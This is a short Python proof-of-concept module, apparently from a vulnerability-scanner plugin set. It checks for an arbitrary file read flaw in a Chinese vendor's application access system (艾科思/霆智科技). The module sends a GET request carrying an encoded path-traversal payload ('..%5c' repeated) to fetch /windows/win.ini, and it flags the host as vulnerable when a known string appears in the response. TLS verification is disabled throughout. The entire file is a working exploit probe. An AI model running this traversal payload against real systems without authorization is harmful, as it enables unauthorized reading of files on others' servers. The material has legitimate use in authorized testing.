#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
def msg():
  ret = {

      'links'     :  'https://mp.weixin.qq.com/s?__biz=MzU2MjY1ODEwMA==&mid=2247488584&idx=1&sn=c8faf35791556f674045b729a4e330e0&chksm=fc677a13cb10f3055dc3ee854b5d5b60c4410508b2d6ce861db8684e0d100204645148f0d72b&scene=178&cur_album_id=2639989517143212033#rd',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   '艾科思（霆智科技）应用接入系统存在任意文件读取',

      'level'     :   'medium',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret

def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  target = '/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/windows/win.ini'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and "for 16-bit app support" in res.text:
      # ret['huixian'] = res.text
      ret['ifbug'] = True
      res.close()
      return ret
    else:
      return ret
  except:
    return ret